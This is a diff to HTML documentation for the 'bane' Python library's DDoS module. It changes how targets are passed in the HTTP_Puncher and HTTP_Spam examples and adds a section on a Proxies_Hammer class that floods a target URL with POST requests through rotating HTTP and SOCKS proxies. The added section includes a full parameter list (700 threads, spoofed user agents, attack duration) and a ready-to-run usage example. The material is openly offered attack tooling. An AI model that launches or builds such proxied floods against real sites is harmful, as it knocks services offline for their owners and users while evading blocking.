@@ -37,7 +37,7 @@ from bane.ddos import HTTP_Puncher
 
 # Create an instance of HTTP_Puncher
 ddos_attack = HTTP_Puncher(
-    u="https://example.com",
+    "https://example.com",
     send_files=True,
     cookie="CustomCookie",
     user_agents=["UserAgent1", "UserAgent2"],
@@ -105,7 +105,7 @@ from bane.ddos import HTTP_Spam
 
 # Create an instance of HTTP_Spam
 http_spam = HTTP_Spam(
-    u="https://example.com",
+    "example.com",
     p=80,
     cookie="CustomCookie",
     user_agents=["UserAgent1", "UserAgent2"],
@@ -135,3 +135,71 @@ http_spam = HTTP_Spam(
 # Be cautious and responsible when using such attack techniques in a real environment.
 </code></pre>
 
+<h1>Proxies_Hammer Class</h1>
+
+<h2>Class Overview</h2>
+<p>The <code>Proxies_Hammer</code> class is part of the "bane" module and is used for launching HTTP POST requests through a list of proxy servers to a target URL.</p>
+
+<h2>Class Constructor</h2>
+<pre><code>class Proxies_Hammer(DDoS_Class)
+</code></pre>
+<p>This constructor initializes an instance of the <code>Proxies_Hammer</code> class with the following parameters:</p>
+
+<ul>
+    <li><code>u</code> (str): The target URL for the POST requests.</li>
+    <li><code>p</code> (int): Port number of the target server (default is 80).</li>
+    <li><code>cookie</code> (str): Custom cookies to include in requests.</li>
+    <li><code>user_agents</code> (list): List of custom User-Agent headers for requests (default is Common_Variables.user_agents_list).</li>
+    <li><code>threads_daemon</code> (bool): Set threads as daemons (default is True).</li>
+    <li><code>scraping_timeout</code> (int): Timeout for proxy scraping in seconds (default is 15).</li>
+    <li><code>max_content</code> (int): Maximum content length for POST requests (default is 15000).</li>
+    <li><code>min_content</code> (int): Minimum content length for POST requests (default is 10000).</li>
+    <li><code>threads</code> (int): Number of threads for the attack (default is 700).</li>
+    <li><code>timeout</code> (int): Request timeout in seconds (default is 5).</li>
+    <li><code>paths</code> (list): List of URL paths to target (default is ["/"]).</li>
+    <li><code>http_proxies</code> (list): List of HTTP proxies to use.</li>
+    <li><code>socks4_proxies</code> (list): List of SOCKS4 proxies to use.</li>
+    <li><code>socks5_proxies</code> (list): List of SOCKS5 proxies to use.</li>
+    <li><code>duration</code> (int): Duration of the attack in seconds (default is 60).</li>
+    <li><code>ssl_on</code> (bool): Enable SSL/TLS for requests (default is False).</li>
+    <li><code>logs</code> (bool): Enable or disable logging (default is True).</li>
+</ul>
+
+<h2>Methods</h2>
+<h3><code>attack(self)</code></h3>
+<p>This method initiates the attack by sending POST requests to the target URL through a list of proxy servers. It operates in a separate thread.</p>
+
+<h2>Example Usage</h2>
+<p>To use the <code>Proxies_Hammer</code> class, create an instance of it by providing the required parameters, and it will start launching the attack in the background. Here's an example:</p>
+
+<pre><code>
+from bane.ddos import Proxies_Hammer
+
+# Create an instance of Proxies_Hammer
+proxy_hammer = Proxies_Hammer(
+    u="https://example.com",
+    p=80,
+    cookie="CustomCookie",
+    user_agents=["UserAgent1", "UserAgent2"],
+    threads_daemon=True,
+    scraping_timeout=15,
+    max_content=15000,
+    min_content=10000,
+    threads=700,
+    timeout=5,
+    paths=["/"],
+    http_proxies=["proxy1:8080", "proxy2:8888"],
+    socks4_proxies=None,
+    socks5_proxies=["socks5_proxy1:1080", "socks5_proxy2:1080"],
+    duration=60,
+    ssl_on=False,
+    logs=True
+)
+
+# Proxy hammer attack is performed in the background
+# Monitor the attack's progress as needed
+
+# To stop the attack, you can set proxy_hammer.stop = True
+
+# Be cautious and responsible when using such attack techniques in a real environment.
+</code></pre>
